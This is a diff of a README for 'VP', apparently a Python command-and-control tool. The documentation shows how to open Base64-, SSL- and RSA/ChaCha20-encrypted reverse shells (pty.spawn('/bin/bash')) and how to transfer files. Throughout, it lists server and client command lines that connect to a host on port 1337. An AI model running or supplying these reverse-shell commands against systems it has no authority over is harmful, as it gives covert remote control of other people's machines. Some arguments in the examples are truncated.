@@ -62,8 +62,6 @@ pip install pycryptodome
 2) [SSL](#ssl)
 3) [VPP](#vpp)
 4) [SSL & VPP](#vpp_&_ssl)
-
-
 ---
 
 ## Base64
@@ -73,15 +71,22 @@ doesn't provide confidentially, integrity, or authenticity, it provides a
 base layer of obfuscation to communications, which is often used by threat 
 actors while acquiring a foothold on a new network.
 
-**Example: Creating a Base64 Encoded Reverse Shell**
+**Leve 1: Base64 examples**
 
 ```bash
-# Server side (long form)
+# Server-side long form:
 python vp.py --server c2 --host 0.0.0.0 --port 1337
 
-# Client side (short form)
-python vp.py -c c2 -ip 192.168.2.16 -p 1337
+# Server-side short form:
+python vp.py -s c2 -ip 0.0.0.0 -p 1337
+
+# Client-side long form:
+python vp.py --client c2 --host 192.168.2.15 --port 1337
+
+# Client-side short form:
+python vp.py -c c2 -ip 192.168.2.15 -p 1337
 ```
+
 
 ### SSL
 
@@ -95,15 +100,30 @@ See [Generate Credentials](#generate-credentials) for VP's built in options
 for producing the required credentials. Fast-gen, in particular, will 
 immediately spit out everything you need.
 
-**Example: Creating an SSL Encrypted Reverse Shell**
+
+Server args:
+- `--private-key` | `-pr`: The RSA private key used to either self-sign the x509 certificate, or create the certificate signing request signed by a root CA.
+- `--certificate` | `-crt`: The signed x509 certificate
+- `--only-ssl` | `-os`: VPP & SSL have the same requirements for credentials, so this argument is necessary to inform VP to only use SSL. 
+
+Client args:
+- `--certificate` | `crt`: Either the root CA signed certificate, or a server self-signed certificate.
+
+
+**Level 2: SSL examples**
 
 ```bash
-# server side (long form)
-python vp.py --server c2 --private-key ./path/privkey.pem --certificate .
-/path/cert.crt --only-ssl --host 0.0.0.0 --port 443
+# Server-side long form:
+python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./key.pem --certificate ./cert.crt --only-ssl
 
-# Client side (short form)
-python vp.py -c c2 -crt ./path/cert.crt -ip www.bobcats.com -p 1337
+# Server-side short form:
+python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./key.pem -crt ./cert. -os
+
+# Client-side short form:
+python vp.py --client c2 --host 192.168.2.15 --port 1337 --certificate ./cert.crt
+
+# Client-side short form:
+python vp.py -c c2 -ip 192.168.2.15 -p 1337 -crt ./cert.crt
 ```
 
 
@@ -118,27 +138,61 @@ ChaCha20-Poly1305 AEAD wrapped in RSA. furthermore
 
 VPP requires that both parties have exchanged RSA public keys in advance. 
 The server administrator must register the remote user's public key in the 
-runtime SQL database in advance of the client connecting (see [Database 
-Operations](#database_operations)). The client has to provide the server's 
-RSA public key as a runtime argument. For detailed information on 
-generating an RSA keypair, see [Generate Credentials](#generate-credentials).
+runtime SQL database in advance of the client connecting. See [Database 
+Operations](#database_operations), specifically [add-key](#add_key). The 
+client has to provide the server's RSA public key as a runtime argument. 
+For detailed information on generating an RSA keypair, see [Generate 
+Credentials](#generate-credentials).
 
 
-**Example VPP Encrypted c2 Host Operation:**
+**Level 3: VPP**
+
+To add Client RSA public keys to the runtime SQL database, see: 
+
+For more information on VPP, see: [vpp](#vpp)
+
+To generate credentials for VPP, see: [rsa](#rsa)
+
 
 ```bash
-# Generate the required credentials (both parties)
-python vp.py -pki rsa
+# Server-side long form:
+python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./server_privkey.pem
 
-# Server side (short form)
-python vp.py -s c2 -pr ./key.pem -ip 0.0.0.0 -p 1337
+# Server-side short form:
+python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./server_privkey.pem
 
-# Client side (long form)
-python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./key.
-pem 
+# Client-side short form:
+python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./my_privkey.pem --public-key ./server_pubkey.pem
+
+# Client-side short form:
+python vp.py -c c2 -ip 192.168.2.15 -p 1337 -pr ./my_privkey.pem -pu ./server_pubkey.pem
 ```
 
 ---
+
+## VPP & SSL
+
+VPP wrapped in TLSv1.3 for obfuscation and robust security. 
+
+**Level 4: VPP & SSL**
+
+
+```bash
+# Server-side long form:
+python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./server_privkey.pem --certificate ./cert.crt
+
+# Server-side short form:
+python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./server_privkey.pem -crt ./cert.
+
+# Client-side short form:
+python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./my_privkey.pem --public-key ./server_pubkey.pem --certificate ./cert.crt
+
+# Client-side short form:
+python vp.py -c c2 -ip 192.168.2.15 -p 1337 -pr ./my_privkey.pem -pu ./server_pubkey.pem -crt ./cert.crt
+```
+
+---
+
 
 ## **Generate Credentials**
 
@@ -281,100 +335,20 @@ runtime. For more information on VP's encryption options, see:
 ### **c2**
 
 VP's Command & Control mode sends a Pythonic reverse shell from the client 
-to the server. `['import pty'; 'pty.spawn('/bin/bash')]` The client runs the shell in a subprocess and 
-uses Pipes to funnel the stdin, stdout & stderr over the network connection,
-allowing VP to encrypt the data streams in the process. VP uses multithreading, pipes, and queues to create a smooth reverse shell experience, while encrypting data in transit.
-
-**c2 Level 1: Base64**
-
-```bash
-# Server-side long form:
-python vp.py --server c2 --host 0.0.0.0 --port 1337
-
-# Server-side short form:
-python vp.py -s c2 -ip 0.0.0.0 -p 1337
-
-# Client-side long form:
-python vp.py --client c2 --host 192.168.2.15 --port 1337
-
-# Client-side short form:
-python vp.py -c c2 -ip 192.168.2.15 -p 1337
-```
-
-**c2 Level 2: SSL**
-
-For more information on VP's use of SSL, see: [ssl](#ssl)
-
-To generate credentials for SSL, see: [Generate Credentials](#generate_credentials)
-
-Server args: 
-- `--private-key` | `-pr`: The RSA private key used to either self-sign the x509 certificate, or create the certificate signing request signed by a root CA.
-- `--certificate` | `-crt`: The signed x509 certificate
-- `--only-ssl` | `-os`: VPP & SSL have the same requirements for credentials, so this argument is necessary to inform VP to only use SSL. 
-
-Client args:
-- `--certificate` | `crt`: Either the root CA signed certificate, or a server self-signed certificate.
-
-```bash
-# Server-side long form:
-python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./key.pem --certificate ./cert.crt --only-ssl
-
-# Server-side short form:
-python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./key.pem -crt ./cert. -os
-
-# Client-side short form:
-python vp.py --client c2 --host 192.168.2.15 --port 1337 --certificate ./cert.crt
-
-# Client-side short form:
-python vp.py -c c2 -ip 192.168.2.15 -p 1337 -crt ./cert.crt
-```
-
-**c2 Level 3: VPP**
-
-The server administrator needs to add client's public keys to the runtime SQL database for the client to successfully authenticate to the server. 
-
-To add Client RSA public keys to the runtime SQL database, see: [add-key](#add_key)
-
-For more information on VPP, see: [vpp](#vpp)
-
-To generate credentials for VPP, see: [rsa](#rsa)
-
-```bash
-# Server-side long form:
-python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./server_privkey.pem
-
-# Server-side short form:
-python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./server_privkey.pem
-
-# Client-side short form:
-python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./my_privkey.pem --public-key ./server_pubkey.pem
-
-# Client-side short form:
-python vp.py -c c2 -ip 192.168.2.15 -p 1337 -pr ./my_privkey.pem -pu ./server_pubkey.pem
-```
-
-**c2 Level 4: VPP & SSL**
-
-Command and Control using VPP wrapped in TLSv1.3 for obfuscation and robust security. 
-
-```bash
-# Server-side long form:
-python vp.py --server c2 --host 0.0.0.0 --port 1337 --private-key ./server_privkey.pem --certificate ./cert.crt
-
-# Server-side short form:
-python vp.py -s c2 -ip 0.0.0.0 -p 1337 -pr ./server_privkey.pem -crt ./cert.
-
-# Client-side short form:
-python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./my_privkey.pem --public-key ./server_pubkey.pem --certificate ./cert.crt
-
-# Client-side short form:
-python vp.py -c c2 -ip 192.168.2.15 -p 1337 -pr ./my_privkey.pem -pu ./server_pubkey.pem -crt ./cert.crt
-```
+to the server. `['import pty'; 'pty.spawn('/bin/bash')]` The client runs 
+the shell in a subprocess and uses Pipes to funnel the stdin, stdout & 
+stderr over the network connection, allowing VP to encrypt the data streams 
+in the process. VP uses multithreading, pipes, and queues to create a 
+smooth reverse shell experience, while encrypting data in transit.  
 
 ---
 
 ### ftp
 
-VP's ftp trasnfers allow for secure data transfer. Alternatively, you can use VP's file encryption to encrypt a file in advance of transfer so that only the intended recipient will be able to decrypt it. Pairing file encryption with secure data transmission makes for a very high degree of security.
+VP's ftp transfers allow for secure data transfer. Alternatively, you can 
+use VP's file encryption to encrypt a file in advance of transfer so that 
+only the intended recipient will be able to decrypt it. Pairing file 
+encryption with secure data transmission makes for a very high degree of 
+security.
 
 
